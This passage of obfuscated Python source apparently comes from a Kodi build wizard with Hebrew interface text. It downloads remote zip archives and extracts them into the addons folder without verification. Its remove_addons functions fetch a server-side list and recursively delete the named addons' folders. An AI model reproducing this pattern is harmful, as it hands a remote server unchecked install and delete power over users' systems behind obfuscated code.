				if not wiz .workingURL (OO000OO000O00OO00 )==True :return #line:5132
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5133
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOOOOO000O0OOOO0O ),'','אנא המתן')#line:5134
				O000OOO00OOOOO000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO0OOO0OOOOOO00 )#line:5135
				try :os .remove (O000OOO00OOOOO000 )#line:5136
				except :pass #line:5137
				logging .warning (OO000OO000O00OO00 )#line:5138
				if 'google'in OO000OO000O00OO00 :#line:5139
				   OO00OO00O0O0O00O0 =googledrive_download (OO000OO000O00OO00 ,O000OOO00OOOOO000 ,DP ,wiz .checkBuild (OOOOOO000O0OOOO0O ,'filesize'))#line:5140
				else :#line:5143
				  downloader .download (OO000OO000O00OO00 ,O000OOO00OOOOO000 ,DP )#line:5144
				xbmc .sleep (100 )#line:5145
				OOOO0OOO000OOOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO000O0OOOO0O )#line:5146
				DP .update (0 ,OOOO0OOO000OOOOOO ,'','אנא המתן')#line:5147
				extract .all (O000OOO00OOOOO000 ,HOME ,DP ,title =OOOO0OOO000OOOOOO )#line:5148
				DP .close ()#line:5149
				wiz .defaultSkin ()#line:5150
				wiz .lookandFeelData ('save')#line:5151
				if KODIV >=18 :#line:5152
					skindialogsettind18 ()#line:5153
				wiz .kodi17Fix ()#line:5154
				if INSTALLMETHOD ==1 :OOO000OO0OO000OO0 =1 #line:5156
				elif INSTALLMETHOD ==2 :OOO000OO0OO000OO0 =0 #line:5157
				else :DP .close ()#line:5158
def gaiaserenaddon ():#line:5160
  O0000OOOO0000OOOO =(ADDON .getSetting ("gaiaseren"))#line:5161
  O000OOOO00OOOO0O0 =(ADDON .getSetting ("rdbuild"))#line:5162
  if O0000OOOO0000OOOO =='true'and O000OOOO00OOOO0O0 =='true':#line:5163
    OO00OOO0OO00O0O0O =(NEWFASTUPDATE )#line:5164
    OOO0OO00000OOO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5165
    O0000O000O00O0OOO =xbmcgui .DialogProgress ()#line:5166
    O0000O000O00O0OOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5167
    O00OO000OOOO0O0OO =os .path .join (PACKAGES ,'isr.zip')#line:5168
    OOO0O000OO0000OOO =urllib2 .Request (OO00OOO0OO00O0O0O )#line:5169
    O000O000O0O0O0000 =urllib2 .urlopen (OOO0O000OO0000OOO )#line:5170
    OO0OO0O00000OO00O =xbmcgui .DialogProgress ()#line:5172
    OO0OO0O00000OO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5173
    OO0OO0O00000OO00O .update (0 )#line:5174
    OO0O00O0O000O0000 =open (O00OO000OOOO0O0OO ,'wb')#line:5176
    try :#line:5178
      O000000OOO0OOOO0O =O000O000O0O0O0000 .info ().getheader ('Content-Length').strip ()#line:5179
      OOO0OOOOOOO00O0O0 =True #line:5180
    except AttributeError :#line:5181
          OOO0OOOOOOO00O0O0 =False #line:5182
    if OOO0OOOOOOO00O0O0 :#line:5184
          O000000OOO0OOOO0O =int (O000000OOO0OOOO0O )#line:5185
    OO0O00000OOO0O00O =0 #line:5187
    OOO000OO0O0O00O00 =time .time ()#line:5188
    while True :#line:5189
          OO000OO0O0OO00000 =O000O000O0O0O0000 .read (8192 )#line:5190
          if not OO000OO0O0OO00000 :#line:5191
              sys .stdout .write ('\n')#line:5192
              break #line:5193
          OO0O00000OOO0O00O +=len (OO000OO0O0OO00000 )#line:5195
          OO0O00O0O000O0000 .write (OO000OO0O0OO00000 )#line:5196
          if not OOO0OOOOOOO00O0O0 :#line:5198
              O000000OOO0OOOO0O =OO0O00000OOO0O00O #line:5199
          if OO0OO0O00000OO00O .iscanceled ():#line:5200
             OO0OO0O00000OO00O .close ()#line:5201
             try :#line:5202
              os .remove (O00OO000OOOO0O0OO )#line:5203
             except :#line:5204
              pass #line:5205
             break #line:5206
          OO00O00000O0OO000 =float (OO0O00000OOO0O00O )/O000000OOO0OOOO0O #line:5207
          OO00O00000O0OO000 =round (OO00O00000O0OO000 *100 ,2 )#line:5208
          OOO0O0O0O00OO00OO =OO0O00000OOO0O00O /(1024 *1024 )#line:5209
          OOOOO00O00OO0OOO0 =O000000OOO0OOOO0O /(1024 *1024 )#line:5210
          O00000O0O00000000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0O0O00OO00OO ,'teal',OOOOO00O00OO0OOO0 )#line:5211
          if (time .time ()-OOO000OO0O0O00O00 )>0 :#line:5212
            OOO0O0O0O0000OOOO =OO0O00000OOO0O00O /(time .time ()-OOO000OO0O0O00O00 )#line:5213
            OOO0O0O0O0000OOOO =OOO0O0O0O0000OOOO /1024 #line:5214
          else :#line:5215
           OOO0O0O0O0000OOOO =0 #line:5216
          O0O0OO00000O000OO ='KB'#line:5217
          if OOO0O0O0O0000OOOO >=1024 :#line:5218
             OOO0O0O0O0000OOOO =OOO0O0O0O0000OOOO /1024 #line:5219
             O0O0OO00000O000OO ='MB'#line:5220
          if OOO0O0O0O0000OOOO >0 and not OO00O00000O0OO000 ==100 :#line:5221
              O00OOOOO00OOO0O00 =(O000000OOO0OOOO0O -OO0O00000OOO0O00O )/OOO0O0O0O0000OOOO #line:5222
          else :#line:5223
              O00OOOOO00OOO0O00 =0 #line:5224
          O0OO0000OOO0O0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0O0O0000OOOO ,O0O0OO00000O000OO )#line:5225
          OO0OO0O00000OO00O .update (int (OO00O00000O0OO000 ),O00000O0O00000000 ,O0OO0000OOO0O0OO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5227
    O000O000O0O000000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5230
    OO0O00O0O000O0000 .close ()#line:5233
    extract .all (O00OO000OOOO0O0OO ,O000O000O0O000000 ,OO0OO0O00000OO00O )#line:5234
    try :#line:5238
      os .remove (O00OO000OOOO0O0OO )#line:5239
    except :#line:5240
      pass #line:5241
def iptvsimpldown ():#line:5242
    O0O0O0O00O000OO0O =(IPTVSIMPL18 )#line:5244
    OO0000O000OO0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5245
    O000OO0O0000O000O =xbmcgui .DialogProgress ()#line:5246
    O000OO0O0000O000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5247
    O00OO0OO0OOOOO0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5248
    OO00OOOO00OOO00OO =urllib2 .Request (O0O0O0O00O000OO0O )#line:5249
    O00OO00O0O0OOO0OO =urllib2 .urlopen (OO00OOOO00OOO00OO )#line:5250
    O0OO0OO00O00O000O =xbmcgui .DialogProgress ()#line:5252
    O0OO0OO00O00O000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5253
    O0OO0OO00O00O000O .update (0 )#line:5254
    OOO000OO00OO0000O =open (O00OO0OO0OOOOO0O0 ,'wb')#line:5256
    try :#line:5258
      O000O00O000O0OOOO =O00OO00O0O0OOO0OO .info ().getheader ('Content-Length').strip ()#line:5259
      OO000O0000OO00O0O =True #line:5260
    except AttributeError :#line:5261
          OO000O0000OO00O0O =False #line:5262
    if OO000O0000OO00O0O :#line:5264
          O000O00O000O0OOOO =int (O000O00O000O0OOOO )#line:5265
    OOO00OO00O0O00O0O =0 #line:5267
    OOOO0OOOO00O0OOO0 =time .time ()#line:5268
    while True :#line:5269
          O0O00OOO00OO0OOOO =O00OO00O0O0OOO0OO .read (8192 )#line:5270
          if not O0O00OOO00OO0OOOO :#line:5271
              sys .stdout .write ('\n')#line:5272
              break #line:5273
          OOO00OO00O0O00O0O +=len (O0O00OOO00OO0OOOO )#line:5275
          OOO000OO00OO0000O .write (O0O00OOO00OO0OOOO )#line:5276
          if not OO000O0000OO00O0O :#line:5278
              O000O00O000O0OOOO =OOO00OO00O0O00O0O #line:5279
          if O0OO0OO00O00O000O .iscanceled ():#line:5280
             O0OO0OO00O00O000O .close ()#line:5281
             try :#line:5282
              os .remove (O00OO0OO0OOOOO0O0 )#line:5283
             except :#line:5284
              pass #line:5285
             break #line:5286
          O0OOO0O00O0OOO00O =float (OOO00OO00O0O00O0O )/O000O00O000O0OOOO #line:5287
          O0OOO0O00O0OOO00O =round (O0OOO0O00O0OOO00O *100 ,2 )#line:5288
          OO00OOOOOOOO0OO00 =OOO00OO00O0O00O0O /(1024 *1024 )#line:5289
          O0OO000O0OOOOOO0O =O000O00O000O0OOOO /(1024 *1024 )#line:5290
          O000O0O0O00O0OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OOOOOOOO0OO00 ,'teal',O0OO000O0OOOOOO0O )#line:5291
          if (time .time ()-OOOO0OOOO00O0OOO0 )>0 :#line:5292
            O00O0O0OOOOO0000O =OOO00OO00O0O00O0O /(time .time ()-OOOO0OOOO00O0OOO0 )#line:5293
            O00O0O0OOOOO0000O =O00O0O0OOOOO0000O /1024 #line:5294
          else :#line:5295
           O00O0O0OOOOO0000O =0 #line:5296
          OO0OOOO0OOOO00O0O ='KB'#line:5297
          if O00O0O0OOOOO0000O >=1024 :#line:5298
             O00O0O0OOOOO0000O =O00O0O0OOOOO0000O /1024 #line:5299
             OO0OOOO0OOOO00O0O ='MB'#line:5300
          if O00O0O0OOOOO0000O >0 and not O0OOO0O00O0OOO00O ==100 :#line:5301
              OO0OOO0O0O0000OOO =(O000O00O000O0OOOO -OOO00OO00O0O00O0O )/O00O0O0OOOOO0000O #line:5302
          else :#line:5303
              OO0OOO0O0O0000OOO =0 #line:5304
          O0O00O00O0O0OO0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0O0OOOOO0000O ,OO0OOOO0OOOO00O0O )#line:5305
          O0OO0OO00O00O000O .update (int (O0OOO0O00O0OOO00O ),O000O0O0O00O0OO0O ,O0O00O00O0O0OO0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5307
    OOO00OOOOOOO00O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5310
    OOO000OO00OO0000O .close ()#line:5313
    extract .all (O00OO0OO0OOOOO0O0 ,OOO00OOOOOOO00O00 ,O0OO0OO00O00O000O )#line:5314
    try :#line:5318
      os .remove (O00OO0OO0OOOOO0O0 )#line:5319
    except :#line:5320
      pass #line:5321
def testnotify ():#line:5322
	O0OO00OO0O0O0O0O0 =wiz .workingURL (NOTIFICATION )#line:5323
	if O0OO00OO0O0O0O0O0 ==True :#line:5324
		try :#line:5325
			O0OO00O00000OO0O0 ,OO0O0OO00O000O00O =wiz .splitNotify (NOTIFICATION )#line:5326
			if O0OO00O00000OO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5327
			if STARTP2 ()=='ok':#line:5328
				notify .notification (OO0O0OO00O000O00O ,True )#line:5329
		except Exception as OO000O0OO0OO0O00O :#line:5330
			wiz .log ("Error on Notifications Window: %s"%str (OO000O0OO0OO0O00O ),xbmc .LOGERROR )#line:5331
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5332
def testnotify2 ():#line:5333
	OO000OOO0OO000O00 =wiz .workingURL (NOTIFICATION2 )#line:5334
	if OO000OOO0OO000O00 ==True :#line:5335
		try :#line:5336
			OOOOOOOOO0OO0OOOO ,O0O000000OOO0O00O =wiz .splitNotify (NOTIFICATION2 )#line:5337
			if OOOOOOOOO0OO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5338
			if STARTP2 ()=='ok':#line:5339
				notify .notification2 (O0O000000OOO0O00O ,True )#line:5340
		except Exception as OOOO000O0OO0O000O :#line:5341
			wiz .log ("Error on Notifications Window: %s"%str (OOOO000O0OO0O000O ),xbmc .LOGERROR )#line:5342
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5343
def testnotify3 ():#line:5344
	OO0O0000O000O0OOO =wiz .workingURL (NOTIFICATION3 )#line:5345
	if OO0O0000O000O0OOO ==True :#line:5346
		try :#line:5347
			O0OO00O0O00O0OO00 ,OO0O00O0OOOOOOOOO =wiz .splitNotify (NOTIFICATION3 )#line:5348
			if O0OO00O0O00O0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5349
			if STARTP2 ()=='ok':#line:5350
				notify .notification3 (OO0O00O0OOOOOOOOO ,True )#line:5351
		except Exception as OOO0OOO0O00O0000O :#line:5352
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OOO0O00O0000O ),xbmc .LOGERROR )#line:5353
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5354
def servicemanual ():#line:5355
	OOO0OOO000000OO0O =wiz .workingURL (HELPINFO )#line:5356
	if OOO0OOO000000OO0O ==True :#line:5357
		try :#line:5358
			OO000O0O00O0OO0O0 ,OOO0O0O0O0O00OO00 =wiz .splitNotify (HELPINFO )#line:5359
			if OO000O0O00O0OO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5360
			notify .helpinfo (OOO0O0O0O0O00OO00 ,True )#line:5361
		except Exception as O00O000OOO0O00O00 :#line:5362
			wiz .log ("Error on Notifications Window: %s"%str (O00O000OOO0O00O00 ),xbmc .LOGERROR )#line:5363
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5364
def testupdate ():#line:5366
	if BUILDNAME =="":#line:5367
		notify .updateWindow ()#line:5368
	else :#line:5369
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5370
def testfirst ():#line:5372
	notify .firstRun ()#line:5373
def testfirstRun ():#line:5375
	notify .firstRunSettings ()#line:5376
def fastinstall ():#line:5379
	notify .firstRuninstall ()#line:5380
def addDir (OOOO0O000OOO00O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5387
	O0OOO000O0O0O0OO0 =sys .argv [0 ]#line:5388
	if not mode ==None :O0OOO000O0O0O0OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5389
	if not name ==None :O0OOO000O0O0O0OO0 +="&name="+urllib .quote_plus (name )#line:5390
	if not url ==None :O0OOO000O0O0O0OO0 +="&url="+urllib .quote_plus (url )#line:5391
	OO0OO00OO000OOOO0 =True #line:5392
	if themeit :OOOO0O000OOO00O0O =themeit %OOOO0O000OOO00O0O #line:5393
	OOOOOOO00O0O00OOO =xbmcgui .ListItem (OOOO0O000OOO00O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5394
	OOOOOOO00O0O00OOO .setInfo (type ="Video",infoLabels ={"Title":OOOO0O000OOO00O0O ,"Plot":description })#line:5395
	OOOOOOO00O0O00OOO .setProperty ("Fanart_Image",fanart )#line:5396
	if not menu ==None :OOOOOOO00O0O00OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5397
	OO0OO00OO000OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOO000O0O0O0OO0 ,listitem =OOOOOOO00O0O00OOO ,isFolder =True )#line:5398
	return OO0OO00OO000OOOO0 #line:5399
def addFile (O000O0O0OO0O00O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5401
	OOOO0OOOO00000OOO =sys .argv [0 ]#line:5402
	if not mode ==None :OOOO0OOOO00000OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5403
	if not name ==None :OOOO0OOOO00000OOO +="&name="+urllib .quote_plus (name )#line:5404
	if not url ==None :OOOO0OOOO00000OOO +="&url="+urllib .quote_plus (url )#line:5405
	OOOO0000O0OOO0O0O =True #line:5406
	if themeit :O000O0O0OO0O00O00 =themeit %O000O0O0OO0O00O00 #line:5407
	O0OO0000O0O0OO0OO =xbmcgui .ListItem (O000O0O0OO0O00O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5408
	O0OO0000O0O0OO0OO .setInfo (type ="Video",infoLabels ={"Title":O000O0O0OO0O00O00 ,"Plot":description })#line:5409
	O0OO0000O0O0OO0OO .setProperty ("Fanart_Image",fanart )#line:5410
	if not menu ==None :O0OO0000O0O0OO0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5411
	OOOO0000O0OOO0O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0OOOO00000OOO ,listitem =O0OO0000O0O0OO0OO ,isFolder =False )#line:5412
	return OOOO0000O0OOO0O0O #line:5413
def get_params ():#line:5415
	OOO0OOOO0OOOOO0O0 =[]#line:5416
	OOOOOO0OO0O0O00OO =sys .argv [2 ]#line:5417
	if len (OOOOOO0OO0O0O00OO )>=2 :#line:5418
		OO0O00O0OO00OOO0O =sys .argv [2 ]#line:5419
		O00O0OOO00OOOOOOO =OO0O00O0OO00OOO0O .replace ('?','')#line:5420
		if (OO0O00O0OO00OOO0O [len (OO0O00O0OO00OOO0O )-1 ]=='/'):#line:5421
			OO0O00O0OO00OOO0O =OO0O00O0OO00OOO0O [0 :len (OO0O00O0OO00OOO0O )-2 ]#line:5422
		OOOOOO0OOO0OOOO0O =O00O0OOO00OOOOOOO .split ('&')#line:5423
		OOO0OOOO0OOOOO0O0 ={}#line:5424
		for OOOO000OOO0000O00 in range (len (OOOOOO0OOO0OOOO0O )):#line:5425
			OO0O0OO00O0O0000O ={}#line:5426
			OO0O0OO00O0O0000O =OOOOOO0OOO0OOOO0O [OOOO000OOO0000O00 ].split ('=')#line:5427
			if (len (OO0O0OO00O0O0000O ))==2 :#line:5428
				OOO0OOOO0OOOOO0O0 [OO0O0OO00O0O0000O [0 ]]=OO0O0OO00O0O0000O [1 ]#line:5429
		return OOO0OOOO0OOOOO0O0 #line:5431
def remove_addons ():#line:5433
	try :#line:5434
			import json #line:5435
			O0O0O0O0OOOOO00O0 =urllib2 .urlopen (remove_url ).readlines ()#line:5436
			for O0OOOO0OOOO0OOOOO in O0O0O0O0OOOOO00O0 :#line:5437
				O0OO0000OOO0OO00O =O0OOOO0OOOO0OOOOO .split (':')[1 ].strip ()#line:5439
				O00O000OOOO0O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0OO0000OOO0OO00O ,'false')#line:5440
				OOO00O0OOOO00O00O =xbmc .executeJSONRPC (O00O000OOOO0O0O0O )#line:5441
				OO00OOOOO0OO0OOO0 =json .loads (OOO00O0OOOO00O00O )#line:5442
				O000O00000000OOO0 =os .path .join (addons_folder ,O0OO0000OOO0OO00O )#line:5444
				if os .path .exists (O000O00000000OOO0 ):#line:5446
					for O00O000OO0000OO00 ,OO00OO0O0O0O00000 ,OOO0O0O00O0O0O00O in os .walk (O000O00000000OOO0 ):#line:5447
						for O0O0O000OO000000O in OOO0O0O00O0O0O00O :#line:5448
							os .unlink (os .path .join (O00O000OO0000OO00 ,O0O0O000OO000000O ))#line:5449
						for O0O0OOOO00OO0000O in OO00OO0O0O0O00000 :#line:5450
							shutil .rmtree (os .path .join (O00O000OO0000OO00 ,O0O0OOOO00OO0000O ))#line:5451
					os .rmdir (O000O00000000OOO0 )#line:5452
			xbmc .executebuiltin ('Container.Refresh')#line:5454
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5455
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5456
	except :pass #line:5457
def remove_addons2 ():#line:5458
	try :#line:5459
			import json #line:5460
			O00O000OOOO0OOO00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5461
			for OO00O0OOO0000OO0O in O00O000OOOO0OOO00 :#line:5462
				O0OO0OO0O0O00000O =OO00O0OOO0000OO0O .split (':')[1 ].strip ()#line:5464
				O0000OOOO0O0000O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0OO0OO0O0O00000O ,'false')#line:5465
				O0O00OO000O00O000 =xbmc .executeJSONRPC (O0000OOOO0O0000O0 )#line:5466
				O000OO0OOOOO0000O =json .loads (O0O00OO000O00O000 )#line:5467
				O000O0O0O000O0O00 =os .path .join (user_folder ,O0OO0OO0O0O00000O )#line:5469
				if os .path .exists (O000O0O0O000O0O00 ):#line:5471
					for OOO0000OO00OOOO00 ,OOOO000O0O0OOOOO0 ,OOOO000O00O00000O in os .walk (O000O0O0O000O0O00 ):#line:5472
						for O0OOOO00OOO0OO0OO in OOOO000O00O00000O :#line:5473
							os .unlink (os .path .join (OOO0000OO00OOOO00 ,O0OOOO00OOO0OO0OO ))#line:5474
						for O0O000OO00OO0OOOO in OOOO000O0O0OOOOO0 :#line:5475
							shutil .rmtree (os .path .join (OOO0000OO00OOOO00 ,O0O000OO00OO0OOOO ))#line:5476
					os .rmdir (O000O0O0O000O0O00 )#line:5477
	except :pass #line:5479
params =get_params ()#line:5480
url =None #line:5481
name =None #line:5482
mode =None #line:5483
try :mode =urllib .unquote_plus (params ["mode"])#line:5485
except :pass #line:5486
try :name =urllib .unquote_plus (params ["name"])#line:5487
except :pass #line:5488
try :url =urllib .unquote_plus (params ["url"])#line:5489
except :pass #line:5490
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5492
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5493
def setView (O00O0OOO00OO0O00O ,O000OOO00OO00O00O ):#line:5494
	if wiz .getS ('auto-view')=='true':#line:5495
		O00O0O0O0O00OOO0O =wiz .getS (O000OOO00OO00O00O )#line:5496
		if O00O0O0O0O00OOO0O =='50'and KODIV >=17 and SKIN =='skin.estuary':O00O0O0O0O00OOO0O ='55'#line:5497
		if O00O0O0O0O00OOO0O =='500'and KODIV >=17 and SKIN =='skin.estuary':O00O0O0O0O00OOO0O ='50'#line:5498
		wiz .ebi ("Container.SetViewMode(%s)"%O00O0O0O0O00OOO0O )#line:5499
if mode ==None :index ()#line:5501
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5503
elif mode =='builds':buildMenu ()#line:5504
elif mode =='viewbuild':viewBuild (name )#line:5505
elif mode =='buildinfo':buildInfo (name )#line:5506
elif mode =='buildpreview':buildVideo (name )#line:5507
elif mode =='install':buildWizard (name ,url )#line:5508
elif mode =='theme':buildWizard (name ,mode ,url )#line:5509
elif mode =='viewthirdparty':viewThirdList (name )#line:5510
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5511
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5512
elif mode =='maint':maintMenu (name )#line:5514
elif mode =='passpin':passandpin ()#line:5515
elif mode =='backmyupbuild':backmyupbuild ()#line:5516
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5517
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5518
elif mode =='advancedsetting':advancedWindow (name )#line:5519
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5520
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5521
elif mode =='asciicheck':wiz .asciiCheck ()#line:5522
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5523
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5524
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5525
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5526
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5527
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5528
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5529
elif mode =='currentsettings':viewAdvanced ()#line:5530
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5531
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5532
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5533
elif mode =='fixskin':backtokodi ()#line:5534
elif mode =='testcommand':testcommand ()#line:5535
elif mode =='logsend':logsend ()#line:5536
elif mode =='rdon':rdon ()#line:5537
elif mode =='rdoff':rdoff ()#line:5538
elif mode =='setrd':setrealdebrid ()#line:5539
elif mode =='setrd2':setautorealdebrid ()#line:5540
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5541
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5542
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5543
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5544
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5545
elif mode =='freshstart':freshStart ()#line:5546
elif mode =='forceupdate':wiz .forceUpdate ()#line:5547
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5548
elif mode =='forceclose':wiz .killxbmc ()#line:5549
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5550
elif mode =='hidepassword':wiz .hidePassword ()#line:5551
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5552
elif mode =='enableaddons':enableAddons ()#line:5553
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5554
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5555
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5556
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5557
elif mode =='uploadlog':uploadLog .Main ()#line:5558
elif mode =='viewlog':LogViewer ()#line:5559
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5560
elif mode =='viewerrorlog':errorChecking (all =True )#line:5561
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5562
elif mode =='purgedb':purgeDb ()#line:5563
elif mode =='fixaddonupdate':fixUpdate ()#line:5564
elif mode =='removeaddons':removeAddonMenu ()#line:5565
elif mode =='removeaddon':removeAddon (name )#line:5566
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5567
elif mode =='removedata':removeAddonData (name )#line:5568
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5569
elif mode =='systeminfo':systemInfo ()#line:5570
elif mode =='restorezip':restoreit ('build')#line:5571
elif mode =='restoregui':restoreit ('gui')#line:5572
elif mode =='restoreaddon':restoreit ('addondata')#line:5573
elif mode =='restoreextzip':restoreextit ('build')#line:5574
elif mode =='restoreextgui':restoreextit ('gui')#line:5575
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5576
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5577
elif mode =='traktsync':traktsync ()#line:5578
elif mode =='apk':apkMenu (name )#line:5580
elif mode =='apkscrape':apkScraper (name )#line:5581
elif mode =='apkinstall':apkInstaller (name ,url )#line:5582
elif mode =='speed':speedMenu ()#line:5583
elif mode =='net':net_tools ()#line:5584
elif mode =='GetList':GetList (url )#line:5585
elif mode =='youtube':youtubeMenu (name )#line:5586
elif mode =='viewVideo':playVideo (url )#line:5587
elif mode =='addons':addonMenu (name )#line:5589
elif mode =='addoninstall':addonInstaller (name ,url )#line:5590
elif mode =='savedata':saveMenu ()#line:5592
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5593
elif mode =='managedata':manageSaveData (name )#line:5594
elif mode =='whitelist':wiz .whiteList (name )#line:5595
elif mode =='trakt':traktMenu ()#line:5597
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5598
